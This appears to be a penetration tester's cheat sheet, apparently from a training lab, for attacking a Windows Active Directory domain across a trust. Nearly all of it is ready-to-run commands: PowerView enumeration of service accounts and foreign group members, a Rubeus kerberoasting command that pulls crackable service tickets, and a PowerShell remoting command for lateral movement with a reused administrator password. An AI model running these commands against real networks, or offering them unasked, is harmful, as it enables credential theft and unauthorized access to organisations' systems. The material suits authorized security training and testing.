# Windows
Enumeration
```
Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof
```
Atack
```
.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
```
# Password Re-Use
Enumeration
```
Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
Convert-SidToName ADMINSID
```
Lateral Movement
```
Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
```
